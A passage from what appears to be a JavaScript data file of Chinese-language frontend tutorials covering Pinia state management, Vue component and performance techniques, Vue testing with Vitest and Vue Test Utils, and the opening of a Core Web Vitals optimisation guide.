      const response = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify(credentials)
      });
      const data = await response.json();
      this.user = data.user;
      this.token = data.token;
      localStorage.setItem('token', data.token);
    },
    
    // 登出
    logout() {
      this.user = null;
      this.token = '';
      localStorage.removeItem('token');
    }
  }
});
\`\`\`

#### 2. 使用其他 Actions

\`\`\`javascript
actions: {
  async loginAndFetchProfile(credentials) {
    // 调用当前 store 的其他 action
    await this.login(credentials);
    
    // 调用其他 store 的 action
    const profileStore = useProfileStore();
    await profileStore.fetchProfile();
  }
}
\`\`\`

#### 3. Action 错误处理

\`\`\`javascript
actions: {
  async login(credentials) {
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify(credentials)
      });
      
      if (!response.ok) {
        throw new Error('Login failed');
      }
      
      const data = await response.json();
      this.user = data.user;
      this.token = data.token;
    } catch (error) {
      console.error('Login error:', error);
      throw error;
    }
  }
}
\`\`\`

### 六、Store 组合

#### 1. 在 Store 中使用其他 Store

\`\`\`javascript
// stores/cart.js
import { defineStore } from 'pinia';
import { useUserStore } from './user';
import { useProductStore } from './product';

export const useCartStore = defineStore('cart', {
  state: () => ({
    items: []
  }),
  getters: {
    total() {
      const userStore = useUserStore();
      const productStore = useProductStore();
      
      const subtotal = this.items.reduce((sum, item) => {
        const product = productStore.getProductById(item.productId);
        return sum + (product?.price || 0) * item.quantity;
      }, 0);
      
      return userStore.isVip ? subtotal * 0.9 : subtotal;
    }
  }
});
\`\`\`

#### 2. 在组件中组合多个 Store

\`\`\`vue
<script setup>
import { useUserStore } from '@/stores/user';
import { useCartStore } from '@/stores/cart';
import { useProductStore } from '@/stores/product';

const userStore = useUserStore();
const cartStore = useCartStore();
const productStore = useProductStore();

// 登录并添加商品到购物车
const buyProduct = async (productId) => {
  if (!userStore.user) {
    await userStore.login({ username: 'guest', password: 'guest' });
  }
  
  const product = productStore.getProductById(productId);
  cartStore.addItem({ productId, quantity: 1 });
};
</script>
\`\`\`

### 七、持久化存储

#### 1. 使用插件持久化

**安装插件：**
\`\`\`bash
npm install pinia-plugin-persistedstate
\`\`\`

**配置插件：**
\`\`\`javascript
// main.js
import { createApp } from 'vue';
import { createPinia } from 'pinia';
import piniaPluginPersistedstate from 'pinia-plugin-persistedstate';

const pinia = createPinia();
pinia.use(piniaPluginPersistedstate);

const app = createApp(App);
app.use(pinia);
\`\`\`

**在 Store 中使用：**
\`\`\`javascript
export const useUserStore = defineStore('user', {
  state: () => ({
    user: null,
    token: ''
  }),
  persist: {
    // 存储键名
    key: 'user-store',
    // 存储位置
    storage: localStorage,
    // 选择要持久化的 paths
    paths: ['token']
  }
});
\`\`\`

#### 2. 手动持久化

\`\`\`javascript
export const useUserStore = defineStore('user', {
  state: () => ({
    user: null,
    token: ''
  }),
  actions: {
    login(credentials) {
      // 登录后存储 token
      this.token = 'new-token';
      localStorage.setItem('token', this.token);
    },
    
    // 初始化时恢复
    init() {
      const token = localStorage.getItem('token');
      if (token) {
        this.token = token;
      }
    }
  }
});
\`\`\`

### 八、TypeScript 支持

#### 1. 类型定义

\`\`\`typescript
// stores/user.ts
import { defineStore } from 'pinia';

interface User {
  id: number;
  name: string;
  email: string;
}

interface UserState {
  user: User | null;
  token: string;
}

export const useUserStore = defineStore('user', {
  state: (): UserState => ({
    user: null,
    token: ''
  }),
  getters: {
    isLoggedIn: (state): boolean => !!state.token,
    userName: (state): string => state.user?.name ?? 'Guest'
  },
  actions: {
    async login(credentials: { username: string; password: string }) {
      const response = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify(credentials)
      });
      const data: { user: User; token: string } = await response.json();
      this.user = data.user;
      this.token = data.token;
    }
  }
});
\`\`\`

#### 2. Setup Store 语法

\`\`\`typescript
// stores/counter.ts
import { defineStore } from 'pinia';
import { ref, computed } from 'vue';

export const useCounterStore = defineStore('counter', () => {
  // state
  const count = ref(0);
  const name = ref('Pinia');
  
  // getters
  const doubleCount = computed(() => count.value * 2);
  const upperName = computed(() => name.value.toUpperCase());
  
  // actions
  function increment() {
    count.value++;
  }
  
  function incrementBy(amount: number) {
    count.value += amount;
  }
  
  function reset() {
    count.value = 0;
  }
  
  return {
    count,
    name,
    doubleCount,
    upperName,
    increment,
    incrementBy,
    reset
  };
});
\`\`\`

### 九、最佳实践

1. **按功能划分 Store**：每个模块一个 store 文件
2. **使用 TypeScript**：获得更好的类型支持
3. **使用 storeToRefs**：解构时保持响应式
4. **合理使用持久化**：只存储必要的数据
5. **错误处理**：在 actions 中处理异步错误
6. **命名规范**：useXxxStore 格式

\`\`\`
stores/
├── user.ts          # 用户相关状态
├── cart.ts          # 购物车相关状态
├── product.ts       # 产品相关状态
├── settings.ts      # 设置相关状态
└── index.ts         # 统一导出
\`\`\`
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue-practical-skills",title:"Vue 实战技巧与最佳实践",category:"vue",difficulty:"medium",tags:["Vue","实战技巧","最佳实践","代码规范"],content:`## Vue 实战技巧与最佳实践

本文总结了 Vue 开发中的实用技巧、常见问题的解决方案和最佳实践，帮助开发者写出更高质量、更易维护的 Vue 代码。

### 一、组件设计技巧

#### 1. 智能组件与展示组件分离

**展示组件（Dumb Component）：**
只负责 UI 渲染，不关心数据来源。

\`\`\`vue
<!-- UserCard.vue -->
<script setup>
defineProps({
  user: {
    type: Object,
    required: true
  },
  loading: {
    type: Boolean,
    default: false
  }
});

defineEmits(['edit', 'delete']);
</script>

<template>
  <div class="user-card">
    <div v-if="loading">加载中...</div>
    <div v-else>
      <h3>{{ user.name }}</h3>
      <p>{{ user.email }}</p>
      <button @click="$emit('edit', user)">编辑</button>
      <button @click="$emit('delete', user.id)">删除</button>
    </div>
  </div>
</template>
\`\`\`

**智能组件（Smart Component）：**
负责数据获取和业务逻辑。

\`\`\`vue
<!-- UserCardContainer.vue -->
<script setup>
import { ref, onMounted } from 'vue';
import UserCard from './UserCard.vue';
import { fetchUser } from '@/api/user';

const props = defineProps({
  userId: Number
});

const user = ref(null);
const loading = ref(false);

const loadUser = async () => {
  loading.value = true;
  try {
    user.value = await fetchUser(props.userId);
  } finally {
    loading.value = false;
  }
};

const handleEdit = (user) => {
  // 编辑逻辑
};

const handleDelete = (userId) => {
  // 删除逻辑
};

onMounted(() => {
  loadUser();
});
</script>

<template>
  <UserCard
    :user="user"
    :loading="loading"
    @edit="handleEdit"
    @delete="handleDelete"
  />
</template>
\`\`\`

#### 2. 使用 v-bind="$attrs" 透传属性

\`\`\`vue
<!-- BaseInput.vue -->
<template>
  <div class="input-wrapper">
    <label v-if="label">{{ label }}</label>
    <input v-bind="$attrs" />
    <span v-if="error" class="error">{{ error }}</span>
  </div>
</template>

<script setup>
defineProps({
  label: String,
  error: String
});
</script>

<!-- 使用 -->
<BaseInput
  v-model="username"
  label="用户名"
  placeholder="请输入用户名"
  :disabled="true"
/>
\`\`\`

#### 3. 使用 defineModel 简化双向绑定（Vue 3.3+）

\`\`\`vue
<!-- CustomInput.vue -->
<script setup>
const modelValue = defineModel({
  type: String,
  required: true
});

const onInput = (event) => {
  modelValue.value = event.target.value;
};
</script>

<template>
  <input :value="modelValue" @input="onInput" />
</template>

<!-- 使用 -->
<template>
  <CustomInput v-model="searchQuery" />
</template>
\`\`\`

### 二、性能优化技巧

#### 1. 使用 v-memo 缓存模板（Vue 3.2+）

\`\`\`vue
<script setup>
import { ref } from 'vue';

const items = ref([]);
const selectedItem = ref(null);
</script>

<template>
  <div>
    <!-- 只有当 items 变化时才重新渲染 -->
    <div v-for="item in items" :key="item.id" v-memo="[items.length]">
      {{ item.name }}
    </div>
    
    <!-- 只有当 selectedItem 变化时才重新渲染 -->
    <div v-memo="[selectedItem?.id]">
      <p>选中：{{ selectedItem?.name }}</p>
    </div>
  </div>
</template>
\`\`\`

#### 2. 使用 shallowRef 优化大对象

\`\`\`vue
<script setup>
import { ref, shallowRef, triggerRef } from 'vue';

// 深层响应式（适合小对象）
const deepData = ref({ nested: { value: 1 } });

// 浅层响应式（适合大对象）
const largeList = shallowRef([]);

// 修改浅层响应式对象时，需要手动触发
const updateList = () => {
  largeList.value.push({ id: 1 });
  triggerRef(largeList); // 手动触发更新
};
</script>
\`\`\`

#### 3. 使用 markRaw 避免不必要的响应式转换

\`\`\`vue
<script setup>
import { ref, markRaw } from 'vue';
import Chart from 'chart.js';

const chart = ref(null);

const initChart = () => {
  // 使用 markRaw 避免将 Chart 实例转换为响应式
  chart.value = markRaw(new Chart(ctx, config));
};
</script>
\`\`\`

#### 4. 使用 Object.freeze 冻结静态数据

\`\`\`vue
<script setup>
import { ref } from 'vue';

// 冻结静态配置
const CONFIG = Object.freeze({
  API_URL: 'https://api.example.com',
  TIMEOUT: 5000
});

// 冻结大型静态列表
const staticOptions = Object.freeze([
  { value: 1, label: 'Option 1' },
  { value: 2, label: 'Option 2' },
  // ... 大量数据
]);
</script>
\`\`\`

### 三、表单处理技巧

#### 1. 使用自定义 Composable 处理表单

\`\`\`javascript
// composables/useForm.js
import { ref, reactive } from 'vue';

export function useForm(initialValues, validateFn) {
  const values = reactive({ ...initialValues });
  const errors = ref({});
  const isSubmitting = ref(false);
  
  function validate() {
    errors.value = validateFn(values) || {};
    return Object.keys(errors.value).length === 0;
  }
  
  async function submit(submitFn) {
    if (!validate()) return;
    
    isSubmitting.value = true;
    try {
      await submitFn(values);
    } catch (error) {
      errors.value.submit = error.message;
    } finally {
      isSubmitting.value = false;
    }
  }
  
  function reset() {
    Object.assign(values, initialValues);
    errors.value = {};
  }
  
  return {
    values,
    errors,
    isSubmitting,
    validate,
    submit,
    reset
  };
}
\`\`\`

**使用示例：**
\`\`\`vue
<script setup>
import { useForm } from '@/composables/useForm';

const { values, errors, submit, isSubmitting } = useForm(
  { username: '', email: '', password: '' },
  (values) => {
    const errors = {};
    if (!values.username) errors.username = '用户名必填';
    if (!values.email) errors.email = '邮箱必填';
    if (!values.password) errors.password = '密码必填';
    return errors;
  }
);

const handleSubmit = async () => {
  await submit(async (data) => {
    // 提交逻辑
    await fetch('/api/register', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
};
</script>

<template>
  <form @submit.prevent="handleSubmit">
    <input v-model="values.username" />
    <span v-if="errors.username">{{ errors.username }}</span>
    
    <input v-model="values.email" type="email" />
    <span v-if="errors.email">{{ errors.email }}</span>
    
    <input v-model="values.password" type="password" />
    <span v-if="errors.password">{{ errors.password }}</span>
    
    <button type="submit" :disabled="isSubmitting">
      {{ isSubmitting ? '提交中...' : '注册' }}
    </button>
  </form>
</template>
\`\`\`

#### 2. 使用 v-model 处理多个输入

\`\`\`vue
<script setup>
import { ref } from 'vue';

const formData = ref({
  username: '',
  email: '',
  phone: ''
});
</script>

<template>
  <form>
    <input v-model="formData.username" placeholder="用户名" />
    <input v-model="formData.email" placeholder="邮箱" />
    <input v-model="formData.phone" placeholder="手机" />
  </form>
</template>
\`\`\`

### 四、API 请求处理技巧

#### 1. 使用自定义 Composable 处理请求

\`\`\`javascript
// composables/useFetch.js
import { ref } from 'vue';

export function useFetch(url, options = {}) {
  const data = ref(null);
  const error = ref(null);
  const loading = ref(false);
  
  async function execute(body = null) {
    loading.value = true;
    error.value = null;
    
    try {
      const response = await fetch(url, {
        ...options,
        body: body ? JSON.stringify(body) : null,
        headers: {
          'Content-Type': 'application/json',
          ...options.headers
        }
      });
      
      if (!response.ok) {
        throw new Error(response.statusText);
      }
      
      data.value = await response.json();
      return data.value;
    } catch (err) {
      error.value = err;
      throw err;
    } finally {
      loading.value = false;
    }
  }
  
  return {
    data,
    error,
    loading,
    execute
  };
}
\`\`\`

**使用示例：**
\`\`\`vue
<script setup>
import { onMounted } from 'vue';
import { useFetch } from '@/composables/useFetch';

const { data: users, loading, execute } = useFetch('/api/users');

onMounted(() => {
  execute();
});
</script>

<template>
  <div v-if="loading">加载中...</div>
  <div v-else-if="users">
    <div v-for="user in users" :key="user.id">
      {{ user.name }}
    </div>
  </div>
</template>
\`\`\`

#### 2. 使用 Axios 拦截器

\`\`\`javascript
// utils/request.js
import axios from 'axios';

const request = axios.create({
  baseURL: '/api',
  timeout: 5000
});

// 请求拦截器
request.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem('token');
    if (token) {
      config.headers.Authorization = \`Bearer \${token}\`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// 响应拦截器
request.interceptors.response.use(
  (response) => response.data,
  (error) => {
    if (error.response?.status === 401) {
      // 处理未授权
      localStorage.removeItem('token');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);

export default request;
\`\`\`

### 五、代码组织技巧

#### 1. 使用 Composables 组织可复用逻辑

\`\`\`javascript
// composables/useDarkMode.js
import { ref, onMounted, onUnmounted } from 'vue';

export function useDarkMode() {
  const isDark = ref(false);
  
  const updateTheme = () => {
    isDark.value = window.matchMedia('(prefers-color-scheme: dark)').matches;
    document.documentElement.classList.toggle('dark', isDark.value);
  };
  
  onMounted(() => {
    updateTheme();
    window.matchMedia('(prefers-color-scheme: dark)')
      .addEventListener('change', updateTheme);
  });
  
  onUnmounted(() => {
    window.matchMedia('(prefers-color-scheme: dark)')
      .removeEventListener('change', updateTheme);
  });
  
  const toggle = () => {
    isDark.value = !isDark.value;
    document.documentElement.classList.toggle('dark', isDark.value);
  };
  
  return { isDark, toggle };
}
\`\`\`

#### 2. 使用脚本片段组织大型组件

\`\`\`vue
<script setup>
import { ref, computed } from 'vue';

// === 类型定义 ===
// const types...

// === Props ===
const props = defineProps({
  userId: Number
});

// === Emits ===
const emit = defineEmits(['update', 'delete']);

// === 状态 ===
const user = ref(null);
const loading = ref(false);

// === 计算属性 ===
const userName = computed(() => user.value?.name || '未知用户');

// === 方法 ===
const loadUser = async () => {
  loading.value = true;
  // 加载逻辑
  loading.value = false;
};

const handleEdit = () => {
  emit('update', user.value);
};

// === 生命周期 ===
onMounted(() => {
  loadUser();
});
</script>
\`\`\`

### 六、调试技巧

#### 1. 使用 Vue Devtools

- 检查组件树和状态
- 追踪事件和生命周期
- 性能分析

#### 2. 添加调试日志

\`\`\`vue
<script setup>
import { ref, watch } from 'vue';

const count = ref(0);

// 调试 watch
watch(
  count,
  (newVal, oldVal) => {
    console.log('[DEBUG] count changed:', { oldVal, newVal });
  },
  { immediate: true }
);
</script>
\`\`\`

#### 3. 使用错误边界

\`\`\`vue
<script setup>
import { onErrorCaptured } from 'vue';

onErrorCaptured((error, instance, info) => {
  console.error('捕获到错误:', error);
  console.error('组件实例:', instance);
  console.error('错误信息:', info);
  
  // 返回 false 阻止错误继续向上传播
  return false;
});
</script>
\`\`\`

### 七、最佳实践总结

1. **组件设计**：智能组件与展示组件分离
2. **性能优化**：合理使用 shallowRef、markRaw、v-memo
3. **表单处理**：使用 Composables 封装表单逻辑
4. **API 请求**：统一处理请求和错误
5. **代码组织**：使用注释分隔不同代码块
6. **类型安全**：使用 TypeScript 定义类型
7. **代码复用**：使用 Composables 提取可复用逻辑
8. **错误处理**：添加错误边界和全局错误处理
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue-testing-guide",title:"Vue 测试完全指南",category:"vue",difficulty:"medium",tags:["Vue","测试","Vitest","Vue Test Utils"],content:`## Vue 测试完全指南

测试是保证代码质量的重要手段。本文详细介绍 Vue 3 应用的测试方法，包括单元测试、组件测试和端到端测试，使用 Vitest 和 Vue Test Utils 等现代测试工具。

### 一、测试基础

#### 1. 测试工具介绍

**Vitest：**
- Vite 原生的测试框架
- 兼容 Jest API
- 极速的测试运行速度
- 内置覆盖率报告

**Vue Test Utils：**
- Vue 官方组件测试库
- 支持 Vue 3
- 提供丰富的组件测试 API

**Testing Library：**
- 用户中心的测试理念
- 鼓励测试行为而非实现
- 更好的可维护性

#### 2. 安装配置

**安装 Vitest：**
\`\`\`bash
npm install -D vitest @vitejs/plugin-vue
\`\`\`

**安装 Vue Test Utils：**
\`\`\`bash
npm install -D @vue/test-utils jsdom
\`\`\`

**安装 Testing Library：**
\`\`\`bash
npm install -D @testing-library/vue @testing-library/jest-dom
\`\`\`

**Vite 配置：**
\`\`\`javascript
// vite.config.js
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';

export default defineConfig({
  plugins: [vue()],
  test: {
    globals: true,
    environment: 'jsdom',
    setupFiles: './src/test/setup.js',
    coverage: {
      reporter: ['text', 'json', 'html']
    }
  }
});
\`\`\`

**测试脚本：**
\`\`\`json
{
  "scripts": {
    "test": "vitest",
    "test:ui": "vitest --ui",
    "test:coverage": "vitest --coverage"
  }
}
\`\`\`

### 二、单元测试

#### 1. 测试 Composables

\`\`\`javascript
// composables/useCounter.js
import { ref } from 'vue';

export function useCounter(initialValue = 0) {
  const count = ref(initialValue);
  
  const increment = () => {
    count.value++;
  };
  
  const decrement = () => {
    count.value--;
  };
  
  const reset = () => {
    count.value = initialValue;
  };
  
  return { count, increment, decrement, reset };
}
\`\`\`

**测试代码：**
\`\`\`javascript
// composables/useCounter.test.js
import { describe, it, expect } from 'vitest';
import { useCounter } from './useCounter';

describe('useCounter', () => {
  it('应该使用初始值初始化 count', () => {
    const { count } = useCounter(10);
    expect(count.value).toBe(10);
  });
  
  it('应该默认初始值为 0', () => {
    const { count } = useCounter();
    expect(count.value).toBe(0);
  });
  
  it('应该递增 count', () => {
    const { count, increment } = useCounter();
    increment();
    expect(count.value).toBe(1);
  });
  
  it('应该递减 count', () => {
    const { count, decrement } = useCounter(5);
    decrement();
    expect(count.value).toBe(4);
  });
  
  it('应该重置 count 到初始值', () => {
    const { count, increment, reset } = useCounter(10);
    increment();
    increment();
    reset();
    expect(count.value).toBe(10);
  });
});
\`\`\`

#### 2. 测试工具函数

\`\`\`javascript
// utils/format.js
export function formatDate(date) {
  if (!date) return '';
  return new Date(date).toLocaleDateString('zh-CN');
}

export function formatCurrency(amount, currency = 'CNY') {
  return new Intl.NumberFormat('zh-CN', {
    style: 'currency',
    currency
  }).format(amount);
}

export function truncate(str, length = 50) {
  if (!str) return '';
  return str.length > length ? str.slice(0, length) + '...' : str;
}
\`\`\`

**测试代码：**
\`\`\`javascript
// utils/format.test.js
import { describe, it, expect } from 'vitest';
import { formatDate, formatCurrency, truncate } from './format';

describe('formatDate', () => {
  it('应该格式化日期', () => {
    const result = formatDate('2024-01-15');
    expect(result).toMatch(/\\d{4}\\/\\d{1,2}\\/\\d{1,2}/);
  });
  
  it('空值应该返回空字符串', () => {
    expect(formatDate(null)).toBe('');
    expect(formatDate(undefined)).toBe('');
    expect(formatDate('')).toBe('');
  });
});

describe('formatCurrency', () => {
  it('应该格式化货币', () => {
    expect(formatCurrency(1000)).toBe('￥1,000.00');
  });
  
  it('应该支持不同货币', () => {
    expect(formatCurrency(1000, 'USD')).toBe('$1,000.00');
  });
});

describe('truncate', () => {
  it('应该截断长字符串', () => {
    const result = truncate('a'.repeat(60), 50);
    expect(result.length).toBe(53); // 50 + '...'
    expect(result).endsWith('...');
  });
  
  it('短字符串不应该被截断', () => {
    expect(truncate('hello')).toBe('hello');
  });
});
\`\`\`

#### 3. 测试 Pinia Store

\`\`\`javascript
// stores/counter.js
import { defineStore } from 'pinia';

export const useCounterStore = defineStore('counter', {
  state: () => ({
    count: 0,
    name: 'counter'
  }),
  getters: {
    doubleCount: (state) => state.count * 2
  },
  actions: {
    increment() {
      this.count++;
    },
    setCount(value) {
      this.count = value;
    }
  }
});
\`\`\`

**测试代码：**
\`\`\`javascript
// stores/counter.test.js
import { describe, it, expect, beforeEach } from 'vitest';
import { setActivePinia, createPinia } from 'pinia';
import { useCounterStore } from './counter';

describe('useCounterStore', () => {
  let store;
  
  beforeEach(() => {
    setActivePinia(createPinia());
    store = useCounterStore();
  });
  
  it('应该初始化 state', () => {
    expect(store.count).toBe(0);
    expect(store.name).toBe('counter');
  });
  
  it('应该递增 count', () => {
    store.increment();
    expect(store.count).toBe(1);
  });
  
  it('应该设置 count', () => {
    store.setCount(10);
    expect(store.count).toBe(10);
  });
  
  it('应该计算 doubleCount', () => {
    store.setCount(5);
    expect(store.doubleCount).toBe(10);
  });
});
\`\`\`

### 三、组件测试

#### 1. 使用 Vue Test Utils

**基础组件：**
\`\`\`vue
<!-- Button.vue -->
<script setup>
defineProps({
  type: {
    type: String,
    default: 'primary',
    validator: (value) => ['primary', 'secondary', 'danger'].includes(value)
  },
  disabled: {
    type: Boolean,
    default: false
  }
});

defineEmits(['click']);
</script>

<template>
  <button
    :class="['btn', \`btn-\${type}\`]"
    :disabled="disabled"
    @click="$emit('click')"
  >
    <slot></slot>
  </button>
</template>
\`\`\`

**测试代码：**
\`\`\`javascript
// components/Button.test.js
import { describe, it, expect, vi } from 'vitest';
import { mount } from '@vue/test-utils';
import Button from './Button.vue';

describe('Button', () => {
  it('应该渲染默认内容', () => {
    const wrapper = mount(Button, {
      slots: { default: '点击我' }
    });
    expect(wrapper.text()).toBe('点击我');
  });
  
  it('应该应用默认类型样式', () => {
    const wrapper = mount(Button);
    expect(wrapper.classes()).toContain('btn-primary');
  });
  
  it('应该应用自定义类型样式', () => {
    const wrapper = mount(Button, {
      props: { type: 'danger' }
    });
    expect(wrapper.classes()).toContain('btn-danger');
  });
  
  it('应该禁用按钮', () => {
    const wrapper = mount(Button, {
      props: { disabled: true }
    });
    expect(wrapper.attributes('disabled')).toBeDefined();
  });
  
  it('应该触发点击事件', async () => {
    const wrapper = mount(Button);
    await wrapper.trigger('click');
    expect(wrapper.emitted('click')).toHaveLength(1);
  });
  
  it('禁用时不应该触发点击事件', async () => {
    const wrapper = mount(Button, {
      props: { disabled: true }
    });
    await wrapper.trigger('click');
    expect(wrapper.emitted('click')).toBeUndefined();
  });
});
\`\`\`

#### 2. 测试带 Props 的组件

\`\`\`vue
<!-- UserCard.vue -->
<script setup>
const props = defineProps({
  user: {
    type: Object,
    required: true,
    validator: (user) => user.id && user.name
  }
});

defineEmits(['select']);
</script>

<template>
  <div class="user-card" @click="$emit('select', user)">
    <h3>{{ user.name }}</h3>
    <p>{{ user.email }}</p>
    <span v-if="user.role" class="role">{{ user.role }}</span>
  </div>
</template>
\`\`\`

**测试代码：**
\`\`\`javascript
// components/UserCard.test.js
import { describe, it, expect, vi } from 'vitest';
import { mount } from '@vue/test-utils';
import UserCard from './UserCard.vue';

describe('UserCard', () => {
  const mockUser = {
    id: 1,
    name: '张三',
    email: 'zhangsan@example.com',
    role: 'admin'
  };
  
  it('应该渲染用户信息', () => {
    const wrapper = mount(UserCard, {
      props: { user: mockUser }
    });
    
    expect(wrapper.text()).toContain('张三');
    expect(wrapper.text()).toContain('zhangsan@example.com');
    expect(wrapper.text()).toContain('admin');
  });
  
  it('应该隐藏角色（当没有 role 时）', () => {
    const wrapper = mount(UserCard, {
      props: { user: { id: 1, name: '李四', email: 'lisi@example.com' } }
    });
    
    expect(wrapper.find('.role').exists()).toBe(false);
  });
  
  it('应该触发 select 事件', async () => {
    const wrapper = mount(UserCard, {
      props: { user: mockUser }
    });
    
    await wrapper.trigger('click');
    
    expect(wrapper.emitted('select')).toHaveLength(1);
    expect(wrapper.emitted('select')[0]).toEqual([mockUser]);
  });
});
\`\`\`

#### 3. 测试带异步操作的组件

\`\`\`vue
<!-- UserList.vue -->
<script setup>
import { ref, onMounted } from 'vue';
import { fetchUsers } from '@/api/user';

const users = ref([]);
const loading = ref(false);
const error = ref(null);

const loadUsers = async () => {
  loading.value = true;
  error.value = null;
  try {
    users.value = await fetchUsers();
  } catch (e) {
    error.value = e.message;
  } finally {
    loading.value = false;
  }
};

onMounted(() => {
  loadUsers();
});
</script>

<template>
  <div>
    <div v-if="loading">加载中...</div>
    <div v-else-if="error">错误：{{ error }}</div>
    <div v-else>
      <div v-for="user in users" :key="user.id">
        {{ user.name }}
      </div>
    </div>
  </div>
</template>
\`\`\`

**测试代码：**
\`\`\`javascript
// components/UserList.test.js
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { mount, flushPromises } from '@vue/test-utils';
import UserList from './UserList.vue';
import { fetchUsers } from '@/api/user';

vi.mock('@/api/user');

describe('UserList', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });
  
  it('应该显示加载状态', () => {
    fetchUsers.mockReturnValue(new Promise(() => {}));
    
    const wrapper = mount(UserList);
    expect(wrapper.text()).toContain('加载中...');
  });
  
  it('应该显示用户列表', async () => {
    const mockUsers = [
      { id: 1, name: '张三' },
      { id: 2, name: '李四' }
    ];
    fetchUsers.mockResolvedValue(mockUsers);
    
    const wrapper = mount(UserList);
    await flushPromises();
    
    expect(wrapper.text()).toContain('张三');
    expect(wrapper.text()).toContain('李四');
  });
  
  it('应该显示错误信息', async () => {
    fetchUsers.mockRejectedValue(new Error('网络错误'));
    
    const wrapper = mount(UserList);
    await flushPromises();
    
    expect(wrapper.text()).toContain('错误：网络错误');
  });
});
\`\`\`

### 四、使用 Testing Library

#### 1. 基础用法

\`\`\`javascript
// components/Counter.test.js
import { describe, it, expect } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/vue';
import Counter from './Counter.vue';

describe('Counter', () => {
  it('应该渲染初始计数', () => {
    render(Counter);
    expect(screen.getByText('计数：0')).toBeInTheDocument();
  });
  
  it('应该递增计数', async () => {
    render(Counter);
    
    const button = screen.getByRole('button', { name: /增加/i });
    await fireEvent.click(button);
    
    expect(screen.getByText('计数：1')).toBeInTheDocument();
  });
  
  it('应该递减计数', async () => {
    render(Counter, {
      props: { initialValue: 5 }
    });
    
    const button = screen.getByRole('button', { name: /减少/i });
    await fireEvent.click(button);
    
    expect(screen.getByText('计数：4')).toBeInTheDocument();
  });
});
\`\`\`

#### 2. 查询方法

\`\`\`javascript
import { render, screen } from '@testing-library/vue';

// 常用查询方法
const {
  getByRole,        // 按角色查询
  getByText,        // 按文本查询
  getByLabelText,   // 按标签查询
  getByPlaceholderText, // 按占位符查询
  getByTestId       // 按测试 ID 查询
} = render(Component);

// 变体
screen.getBy...;        // 找不到时抛出错误
screen.queryBy...;      // 找不到时返回 null
screen.findBy...;       // 异步查询
screen.getAllBy...;     // 返回所有匹配
\`\`\`

### 五、测试最佳实践

1. **测试行为而非实现**：关注组件做什么，而不是怎么做
2. **使用有意义的测试名称**：描述测试的目的
3. **保持测试独立**：每个测试应该独立运行
4. **使用 beforeEach 清理**：确保测试环境干净
5. **Mock 外部依赖**：隔离测试单元
6. **测试边界条件**：空值、错误状态等
7. **保持测试简洁**：一个测试只验证一件事

### 六、测试覆盖率

**生成覆盖率报告：**
\`\`\`bash
npm run test:coverage
\`\`\`

**配置覆盖率阈值：**
\`\`\`javascript
// vite.config.js
export default defineConfig({
  test: {
    coverage: {
      reporter: ['text', 'json', 'html'],
      thresholds: {
        lines: 80,
        functions: 80,
        branches: 80,
        statements: 80
      }
    }
  }
});
\`\`\`
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"core-web-vitals",title:"Core Web Vitals 核心指标优化",category:"performance",difficulty:"medium",tags:["性能优化","Core Web Vitals","LCP","FID","CLS"],content:`## Core Web Vitals 核心指标优化

Core Web Vitals 是 Google 推出的用户体验核心指标，包括 LCP、FID 和 CLS，对网站的 SEO 和用户体验至关重要。

### ⚡ LCP (Largest Contentful Paint)

**定义：**
- **最大内容绘制时间**
- **衡量页面主要内容加载完成的时间**
- **目标值：< 2.5秒**：LCP的目标是确保用户能够在2.5秒内看到页面的主要内容，这个阈值基于大量用户体验研究得出，2.5秒以内的LCP被认为是良好的用户体验，超过2.5秒需要改进，超过4秒则被认为较差的体验，LCP是Core Web Vitals中最重要的指标，直接影响用户对页面加载速度的感知

**优化策略：**
- **优化服务器响应时间**
- **使用 CDN 分发静态资源**
- **预加载关键资源**
- **优化图片大小和格式**
- **减少第三方脚本阻塞**

**监控工具：**
- **Google PageSpeed Insights**
- **Lighthouse**
- **Web Vitals Chrome 扩展**

### 💻 代码示例：LCP 优化

\`\`\`html
<!-- 预加载关键资源 -->
<link rel="preload" as="image" href="/hero-image.webp">
<link rel="preload" as="font" href="/fonts/main.woff2" crossorigin>
<link rel="preload" as="style" href="/styles/main.css">

<!-- 预连接到重要域名 -->
<link rel="preconnect" href="https://cdn.example.com">
<link rel="dns-prefetch" href="https://api.example.com">

<!-- 优化图片 -->
<picture>
  <source srcset="/hero-image.avif" type="image/avif">
  <source srcset="/hero-image.webp" type="image/webp">
  <img src="/hero-image.jpg" alt="Hero Image" loading="eager" width="1200" height="600">
</picture>
\`\`\`

#### LCP 监控示例

\`\`\`javascript
// 使用 Web Vitals 库监控 LCP
import { onLCP } from 'web-vitals';

onLCP((metric) => {
  console.log('LCP:', metric);
  
  // 发送到分析服务
  if (navigator.sendBeacon) {
    const data = new URLSearchParams();
    data.set('name', metric.name);
    data.set('value', metric.value.toString());
    data.set('id', metric.id);
    
    navigator.sendBeacon('/analytics', data);
  }
  
  // 判断是否达标
  if (metric.rating === 'good') {
    console.log('LCP is good!');
  } else if (metric.rating === 'needs-improvement') {
    console.warn('LCP needs improvement');
  } else {
    console.error('LCP is poor!');
  }
});
\`\`\`

### FID (First Input Delay)

**定义：**
- 首次输入延迟
- 衡量用户首次与页面交互到浏览器响应的时间
- 目标值：< 100ms：FID用于衡量用户首次与页面交互（如点击按钮、输入文字）时，浏览器能够多快地响应，这个指标关注的是页面的可交互性而非加载速度，100ms以内的延迟被认为是良好的用户体验，超过300ms则被认为较差的体验，FID主要受JavaScript执行时间和主线程阻塞程度影响，优化FID的关键是减少主线程的工作量

**优化策略：**
- 减少 JavaScript 执行时间
- 代码分割和懒加载
- 使用 Web Workers 处理耗时任务
- 优化第三方脚本
- 避免长任务阻塞主线程

**监控工具：**
- Chrome DevTools Performance 面板
- Web Vitals 库
- Google Search Console

### 代码示例

#### FID 优化示例

\`\`\`javascript
